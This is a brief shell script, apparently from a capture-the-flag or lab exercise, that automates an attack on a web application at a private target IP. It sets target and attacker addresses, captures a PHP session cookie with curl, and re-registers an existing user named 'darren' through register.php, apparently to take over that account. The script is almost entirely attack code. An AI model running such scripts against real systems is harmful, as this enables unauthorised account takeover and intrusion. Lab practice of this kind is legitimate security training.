#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Define host IP ( the machine to attack ) and remote IP ( the machine which supports the attack )
target_ip="10.10.210.85"
attack_ip="10.10.30.237"

# Prepare environment
mkdir /work/ 2>/dev/null

# Initiate session
echo "1 - INITIATING SESSION"
curl -s -X GET "http://$target_ip:8088" -c "/work/7-cookies.txt" -L > /dev/null
PHPSESSID=$(grep PHPSESSID "/work/7-cookies.txt" | awk '{print $7}')
echo "--> Session initiated : $PHPSESSID"

# Registering darren a second time
echo "2 - REGISTERING DARREN"
curl -s -X POST "http://$target_ip:8088/register.php" -b /work/7-cookies.txt -L -F "user=darren" -F "email=darren@gmail.com" -F "pass=test" -F "submit=Register" -v
